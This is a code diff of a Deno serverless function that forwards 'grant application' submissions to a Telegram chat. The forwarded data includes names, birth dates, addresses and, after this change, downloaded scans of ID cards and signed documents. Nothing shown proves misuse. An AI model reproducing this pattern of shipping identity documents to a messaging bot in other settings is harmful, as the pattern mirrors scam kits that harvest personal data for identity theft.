@@ -10,14 +10,10 @@ Deno.serve(async (req) => {
 
   try {
     const TELEGRAM_BOT_TOKEN = Deno.env.get('TELEGRAM_BOT_TOKEN');
-    if (!TELEGRAM_BOT_TOKEN) {
-      throw new Error('TELEGRAM_BOT_TOKEN is not configured');
-    }
+    if (!TELEGRAM_BOT_TOKEN) throw new Error('TELEGRAM_BOT_TOKEN is not configured');
 
     const TELEGRAM_CHAT_ID = Deno.env.get('TELEGRAM_CHAT_ID');
-    if (!TELEGRAM_CHAT_ID) {
-      throw new Error('TELEGRAM_CHAT_ID is not configured');
-    }
+    if (!TELEGRAM_CHAT_ID) throw new Error('TELEGRAM_CHAT_ID is not configured');
 
     const body = await req.json();
     const {
@@ -33,10 +29,9 @@ Deno.serve(async (req) => {
       );
     }
 
-    // Build the Telegram message
+    // Build the Telegram text message
     let message = `🆕 <b>New Grant Application</b>\n\n`;
 
-    // Personal details
     message += `<b>── Personal Details ──</b>\n`;
     message += `👤 <b>Name:</b> ${esc(full_name)}\n`;
     message += `📧 <b>Email:</b> ${esc(email)}\n`;
@@ -44,18 +39,15 @@ Deno.serve(async (req) => {
     if (date_of_birth) message += `🎂 <b>Date of Birth:</b> ${esc(date_of_birth)}\n`;
     if (occupation) message += `💼 <b>Occupation:</b> ${esc(occupation)}\n`;
 
-    // Address
     const addressParts = [street_address, city, state_province, country].filter(Boolean);
     if (addressParts.length > 0) {
       message += `🏠 <b>Address:</b> ${esc(addressParts.join(', '))}\n`;
     }
 
-    // Funding
     message += `\n<b>── Funding Details ──</b>\n`;
     message += `💰 <b>Amount Requested:</b> $${Number(amount_requested).toLocaleString('en-US', { minimumFractionDigits: 2 })}\n`;
     if (purpose) message += `📝 <b>Purpose:</b> ${esc(purpose)}\n`;
 
-    // Questionnaire answers
     if (answers && typeof answers === 'object' && Object.keys(answers).length > 0) {
       message += `\n<b>── Questionnaire ──</b>\n`;
       const labels: Record<string, string> = {
@@ -73,20 +65,11 @@ Deno.serve(async (req) => {
       }
     }
 
-    // Document links
-    const hasDocLinks = id_card_front_url || id_card_back_url || signed_document_url;
-    if (hasDocLinks) {
-      message += `\n<b>── Documents ──</b>\n`;
-      if (id_card_front_url) message += `🪪 <a href="${esc(id_card_front_url)}">ID Card Front</a>\n`;
-      if (id_card_back_url) message += `🪪 <a href="${esc(id_card_back_url)}">ID Card Back</a>\n`;
-      if (signed_document_url) message += `📎 <a href="${esc(signed_document_url)}">Signed Document</a>\n`;
-    }
-
     message += `\n⏰ <b>Submitted:</b> ${new Date().toUTCString()}`;
 
-    // Send to Telegram
-    const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-    const telegramResponse = await fetch(telegramUrl, {
+    // Send the text message first
+    const telegramBase = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
+    const textRes = await fetch(`${telegramBase}/sendMessage`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
@@ -97,11 +80,61 @@ Deno.serve(async (req) => {
       }),
     });
 
-    const telegramData = await telegramResponse.json();
+    if (!textRes.ok) {
+      const data = await textRes.json();
+      console.error('Telegram sendMessage error:', JSON.stringify(data));
+      throw new Error(`Telegram sendMessage failed [${textRes.status}]`);
+    }
 
-    if (!telegramResponse.ok) {
-      console.error('Telegram API error:', JSON.stringify(telegramData));
-      throw new Error(`Telegram API failed [${telegramResponse.status}]: ${JSON.stringify(telegramData)}`);
+    // Send document images as actual photos via sendPhoto
+    const imageEntries: { url: string; caption: string }[] = [];
+    if (id_card_front_url) imageEntries.push({ url: id_card_front_url, caption: `🪪 ID Card — Front\n${full_name}` });
+    if (id_card_back_url) imageEntries.push({ url: id_card_back_url, caption: `🪪 ID Card — Back\n${full_name}` });
+    if (signed_document_url) imageEntries.push({ url: signed_document_url, caption: `📎 Signed Document\n${full_name}` });
+
+    for (const img of imageEntries) {
+      try {
+        // Download the image from the signed URL
+        const imgResponse = await fetch(img.url);
+        if (!imgResponse.ok) {
+          console.error(`Failed to download image: ${imgResponse.status}`);
+          continue;
+        }
+
+        const imgBlob = await imgResponse.blob();
+        const contentType = imgResponse.headers.get('content-type') || 'image/jpeg';
+        const ext = contentType.includes('png') ? 'png' : contentType.includes('webp') ? 'webp' : 'jpg';
+
+        // Send as photo using multipart form data
+        const formData = new FormData();
+        formData.append('chat_id', TELEGRAM_CHAT_ID);
+        formData.append('caption', img.caption);
+        formData.append('photo', new File([imgBlob], `document.${ext}`, { type: contentType }));
+
+        const photoRes = await fetch(`${telegramBase}/sendPhoto`, {
+          method: 'POST',
+          body: formData,
+        });
+
+        if (!photoRes.ok) {
+          // If sendPhoto fails (e.g. file too large or not an image), try sendDocument
+          const docFormData = new FormData();
+          docFormData.append('chat_id', TELEGRAM_CHAT_ID);
+          docFormData.append('caption', img.caption);
+          docFormData.append('document', new File([imgBlob], `document.${ext}`, { type: contentType }));
+
+          const docRes = await fetch(`${telegramBase}/sendDocument`, {
+            method: 'POST',
+            body: docFormData,
+          });
+
+          if (!docRes.ok) {
+            console.error('sendDocument also failed for:', img.caption);
+          }
+        }
+      } catch (imgErr) {
+        console.error('Error sending image to Telegram:', imgErr);
+      }
     }
 
     return new Response(
